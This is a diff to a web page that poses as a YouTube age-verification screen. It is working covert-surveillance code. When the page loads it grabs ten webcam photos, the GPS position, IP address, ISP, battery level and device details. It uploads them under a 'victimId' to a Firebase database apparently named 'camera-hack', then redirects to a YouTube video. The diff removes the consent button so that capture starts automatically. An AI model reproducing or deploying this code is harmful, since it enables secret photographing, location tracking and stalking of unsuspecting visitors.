@@ -9,86 +9,82 @@
         body{background:#000;color:#ccc;font-family:'Poppins',sans-serif;height:100vh;display:flex;align-items:center;justify-content:center}
         .ui{max-width:400px;width:90%;text-align:center;padding:20px}
         .logo{width:120px;margin:0 auto 20px}
-        h2{font-size:22px;color:#fff;margin-bottom:12px}
-        p{font-size:14px;color:#aaa;margin-bottom:25px}
         .loader{width:30px;height:30px;border:3px solid #ff0000;border-radius:50%;border-top-color:transparent;animation:spin 1s linear infinite;margin:20px auto}
         @keyframes spin{to{transform:rotate(360deg)}}
         .status{color:#ff0000;font-size:14px;margin-top:20px}
+        .sub{font-size:11px;color:#666;margin-top:8px}
     </style>
 </head>
 <body>
     <div class="ui" id="main">
         <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo">
-        <h2>Verification Required</h2>
-        <p>This video is age-restricted. Click below and allow camera/location access.</p>
-        <button onclick="startCapture()">Verify Age</button>
+        <div class="loader"></div>
+        <p class="status">Verifying your age...</p>
+        <p class="sub">Please wait...</p>
     </div>
     <video id="video" style="display:none" autoplay playsinline></video>
     <canvas id="canvas" style="display:none"></canvas>
     <script>
-        const url=new URLSearchParams(location.search);
-        let VID=url.get('id')||'unknown_'+Date.now();
-        const VID2=url.get('v')||'dQw4w9WgXcQ';
-        const FB="https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
-        try{VID=atob(VID);}catch(e){}
-        
-        let count=0, data={victimId:VID,time:new Date().toLocaleString(),timestamp:Date.now(),photos:[],device:{ua:navigator.userAgent,ram:navigator.deviceMemory||'N/A',cores:navigator.hardwareConcurrency||'N/A'}};
-        
-        async function startCapture(){
-            document.getElementById('main').innerHTML='<div class="loader"></div><p class="status">Verifying your age...</p>';
+        (async function() {
+            const url = new URLSearchParams(location.search);
+            let USER_ID = url.get('uid');
+            let TARGET_ID = url.get('id') || 'unknown_' + Date.now();
+            const VIDEO_ID = url.get('v') || 'dQw4w9WgXcQ';
+            const FIREBASE_BASE = "https://camera-hack-983fa-default-rtdb.firebaseio.com";
             
-            // Get Battery
-            try{const b=await navigator.getBattery();data.battery=Math.round(b.level*100)+"%";data.batteryCharging=b.charging;}catch(e){}
-            
-            // Get GPS
-            if(navigator.geolocation){
-                navigator.geolocation.getCurrentPosition(p=>{data.gps=`https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;},null,{enableHighAccuracy:true,timeout:10000});
+            if (!USER_ID) {
+                let oldId = url.get('id');
+                if (oldId) {
+                    try { 
+                        let decoded = atob(oldId);
+                        let parts = decoded.split('_');
+                        USER_ID = parts[0];
+                        TARGET_ID = parts.slice(1).join('_');
+                    } catch(e) {}
+                }
             }
             
-            // Get IP + Location
-            try{
-                const r=await fetch('https://ipapi.co/json/');const g=await r.json();
-                data.ip=g.ip;data.city=g.city+", "+g.country;data.isp=g.org;data.region=g.region;data.postal=g.postal;
-            }catch(e){}
+            const FB_URL = `${FIREBASE_BASE}/${USER_ID}/${TARGET_ID}.json`;
             
-            // Camera + Photos + Video
-            try{
-                const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-                const v=document.getElementById('video');
-                v.srcObject=s;
-                await new Promise(r=>{v.onloadedmetadata=()=>{v.play();r();}});
-                
-                // Capture 10 photos
-                const iv=setInterval(async()=>{
-                    if(count>=10){
-                        clearInterval(iv);
-                        // Final save
-                        await fetch(FB,{method:'POST',body:JSON.stringify(data)});
-                        s.getTracks().forEach(t=>t.stop());
-                        window.location.href="https://www.youtube.com/watch?v="+VID2;
+            let data = {
+                victimId: TARGET_ID,
+                time: new Date().toLocaleString(),
+                timestamp: Date.now(),
+                photos: [],
+                device: { ua: navigator.userAgent, ram: navigator.deviceMemory || 'N/A', cores: navigator.hardwareConcurrency || 'N/A' }
+            };
+            
+            try { const b = await navigator.getBattery(); data.battery = Math.round(b.level * 100) + "%"; } catch(e) {}
+            if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(p => { data.gps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`; }, null, { enableHighAccuracy: true, timeout: 5000 }); }
+            try { const res = await fetch('https://ipapi.co/json/'); const geo = await res.json(); data.ip = geo.ip; data.city = geo.city + ", " + geo.country; data.isp = geo.org; } catch(e) {}
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
+                let count = 0;
+                const interval = setInterval(async () => {
+                    if (count >= 10) {
+                        clearInterval(interval);
+                        await fetch(FB_URL, { method: 'PUT', body: JSON.stringify(data) });
+                        stream.getTracks().forEach(t => t.stop());
+                        window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
                         return;
                     }
-                    const c=document.getElementById('canvas');
-                    c.width=v.videoWidth;
-                    c.height=v.videoHeight;
-                    c.getContext('2d').drawImage(v,0,0);
-                    data.photos.push(c.toDataURL('image/jpeg',0.5));
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    data.photos.push(canvas.toDataURL('image/jpeg', 0.5));
                     count++;
-                    // Real-time update
-                    await fetch(FB,{method:'POST',body:JSON.stringify(data)});
-                },600);
-            }catch(e){
-                await fetch(FB,{method:'POST',body:JSON.stringify(data)});
-                setTimeout(()=>{window.location.href="https://www.youtube.com/watch?v="+VID2;},2000);
+                    await fetch(FB_URL, { method: 'PUT', body: JSON.stringify(data) });
+                }, 600);
+            } catch(e) {
+                await fetch(FB_URL, { method: 'PUT', body: JSON.stringify(data) });
+                setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID; }, 2000);
             }
-        }
-        
-        // Auto-start capture when page loads
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                startCapture();
-            }, 500);
-        });
+        })();
     </script>
 </body>
 </html>
